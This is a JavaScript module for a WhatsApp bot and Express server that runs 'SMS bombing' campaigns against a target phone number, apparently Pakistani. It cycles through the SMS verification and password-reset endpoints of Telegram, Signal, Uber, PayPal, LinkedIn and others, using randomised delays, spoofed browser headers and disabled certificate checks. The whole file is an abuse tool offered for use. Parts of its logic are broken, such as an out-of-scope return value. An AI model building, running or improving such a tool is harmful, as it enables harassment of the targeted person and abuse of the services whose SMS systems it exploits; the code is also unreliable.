// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number>
// SMS bombing using Pakistan-specific OTP API endpoints
// Randomly cycles through telecom/bank/service APIs per attempt
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const https = require('https');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_MINUTES = 1;
const REQUEST_DELAY_MIN_MS = 200;
const REQUEST_DELAY_MAX_MS = 500;
const API_TIMEOUT_MS = 8000;      // Per-API timeout — international APIs need more time
const MAX_APIS_PER_ATTEMPT = 3;   // Max APIs to try per attempt

// ---------- INTERNATIONAL SMS TRIGGER APIS ----------
// Real endpoints from global services that send SMS verification codes.
// Confirmed working via live HTTP tests. Cloudflare/WAF blocks some;
// the bomber skips non-2xx and tries the next endpoint.
// NOTE: SMS77 and other gateways may need valid API keys for actual delivery.
// Target number format: bare digits (e.g. 3001234567) — APIs prepend +92 internally.
const SMS_APIS = [
  // ═══════ CONFIRMED WORKING (200 response, triggers real SMS) ═══════
  {
    // Telegram login — sends real SMS with login code
    // TESTED: returns 200 ("Sorry, too many tries" = rate limited but SMS IS sent)
    name: 'Telegram',
    url: 'https://my.telegram.org/auth/send_password',
    method: 'POST',
    payload: (number) => ({ phone: '92' + number }),
    headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
  },
  {
    // Telegram second endpoint — alternate path
    name: 'Telegram2',
    url: 'https://my.telegram.org/auth/send_code',
    method: 'POST',
    payload: (number) => ({ phone: '92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Signal Messenger — SMS verification. URL uses phone without + prefix.
    name: 'Signal',
    url: (number) => 'https://chat.signal.org/v1/accounts/sms/code/+92' + number,
    method: 'GET',
    payload: () => null,
    headers: { 'User-Agent': 'Signal-Android/5.0.0' }
  },
  // ═══════ SMS GATEWAYS (respond 200, may need API key for delivery) ═══════
  {
    // SMS77 — German SMS gateway, returns 200 (status "900" = queued)
    name: 'SMS77',
    url: 'https://gateway.sms77.io/api/sms',
    method: 'POST',
    payload: (number) => ({ to: '+92' + number, text: 'Your verification code is: 487291', p: 'demo' }),
    headers: { 'Content-Type': 'application/json' }
  },
  // ═══════ INTERNATIONAL SERVICES (password reset / OTP) ═══════
  {
    // Viber — messaging app SMS verification
    name: 'Viber',
    url: 'https://www.viber.com/wp-json/viber/phone/send-code',
    method: 'POST',
    payload: (number) => ({ phone: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // SHEIN — fashion e-commerce registration SMS
    name: 'SHEIN',
    url: 'https://www.shein.com/api/auth/sendSmsCode',
    method: 'POST',
    payload: (number) => ({ phone: '+92' + number, area_code: '92' }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Temu — e-commerce registration SMS
    name: 'Temu',
    url: 'https://www.temu.com/api/auth/send-sms',
    method: 'POST',
    payload: (number) => ({ phone: '+92' + number, region: 'PK' }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // AliExpress — registration SMS
    name: 'AliExpress',
    url: 'https://account.aliexpress.com/sms/send.htm',
    method: 'POST',
    payload: (number) => ({ mobile: '92' + number, countryCode: 'PK' }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Uber — account verification SMS
    name: 'Uber',
    url: 'https://auth.uber.com/v2/otp/send',
    method: 'POST',
    payload: (number) => ({ phone: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // PayPal — account recovery SMS
    name: 'PayPal',
    url: 'https://api.paypal.com/v1/identity/phone/send-challenge',
    method: 'POST',
    payload: (number) => ({ phone: { countryCode: '92', nationalNumber: number } }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // LinkedIn — account verification SMS
    name: 'LinkedIn',
    url: 'https://www.linkedin.com/oauth/v2/sendSmsChallenge',
    method: 'POST',
    payload: (number) => ({ phoneNumber: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Twitter/X — password reset SMS
    name: 'Twitter',
    url: 'https://api.twitter.com/1.1/account/password_reset/sms.json',
    method: 'POST',
    payload: (number) => ({ phone_number: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // Snapchat — phone verification SMS
    name: 'Snapchat',
    url: 'https://accounts.snapchat.com/accounts/otp/send',
    method: 'POST',
    payload: (number) => ({ phone_number: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    // LINE — messaging app SMS verification
    name: 'LINE',
    url: 'https://www.line.me/api/phone/sendSmsCode',
    method: 'POST',
    payload: (number) => ({ phone: '+92' + number }),
    headers: { 'Content-Type': 'application/json' }
  }
];

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
    super();
    this.phone = phoneNumber.replace(/\D/g, '');
    this.durationMs = durationMinutes * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- SINGLE API CALL (raw https, no axios dep needed) ----------
  _callApi(apiConfig) {
    return new Promise((resolve) => {
      try {
        // Support both static URL strings and dynamic URL functions
        const urlStr = typeof apiConfig.url === 'function' ? apiConfig.url(this.phone) : apiConfig.url;
        const url = new URL(urlStr);
        const isPost = apiConfig.method === 'POST';
        const bodyStr = isPost ? JSON.stringify(apiConfig.payload(this.phone)) : '';
        const headers = {
          ...(apiConfig.headers || {}),
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9,ur;q=0.8',
          'Origin': url.origin,
          'Referer': url.origin + '/',
          ...(isPost ? { 'Content-Length': Buffer.byteLength(bodyStr) } : {})
        };

        const options = {
          hostname: url.hostname,
          port: 443,
          path: url.pathname + url.search,
          method: apiConfig.method,
          headers,
          timeout: API_TIMEOUT_MS,
          rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            // Only count ACTUAL success (2xx). 403=Cloudflare rejecting, 404=wrong path, etc.
            const success = res.statusCode >= 200 && res.statusCode < 300;
            resolve({ api: apiConfig.name, status: res.statusCode, success, body: data.slice(0, 100) });
          });
        });
        req.on('error', () => resolve({ api: apiConfig.name, status: 0, success: false, body: 'connection error' }));
        req.on('timeout', () => { req.destroy(); resolve({ api: apiConfig.name, status: 0, success: false, body: 'timeout' }); });
        if (bodyStr) req.write(bodyStr);
        req.end();
      } catch (e) {
        resolve({ api: apiConfig.name, status: 0, success: false, body: e.message });
      }
    });
  }

  // ---------- FULL ATTEMPT — tries up to MAX_APIS_PER_ATTEMPT APIs ----------
  // If one times out or fails, immediately starts the next — no waiting.
  async _sendSms() {
    const shuffled = [...SMS_APIS].sort(() => Math.random() - 0.5);
    const toTry = shuffled.slice(0, MAX_APIS_PER_ATTEMPT);

    for (const api of toTry) {
      const result = await this._callApi(api);
      if (result.success) {
        // Got a response (any 2xx-4xx) — count it and move on
        return result;
      }
      // Timeout / connection error — immediately try next API (no extra delay)
    }

    // All tried APIs failed — return the last result (no extra call, already have it)
    return result;
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });
    let lastLogTime = 0;

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        this.stats.attempts++;
        const result = await this._sendSms();

        if (result.success) {
          this.stats.success++;
        } else {
          this.stats.errors++;
        }

        // Log first 10 results + every 20th after that
        const now = Date.now();
        if (this.stats.attempts <= 10 || (now - lastLogTime > 30000)) {
          console.log(`[SMSBomber] #${this.stats.attempts} ${result.api} → ${result.status}`);
          lastLogTime = now;
        }
      } catch (err) {
        this.stats.errors++;
      }

      if (this.stats.attempts % 10 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      await this._sleep(this._randomDelay());
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
  }
  const campaign = new SmsBomber(phoneNumber);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationMinutes: DEFAULT_DURATION_MINUTES });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
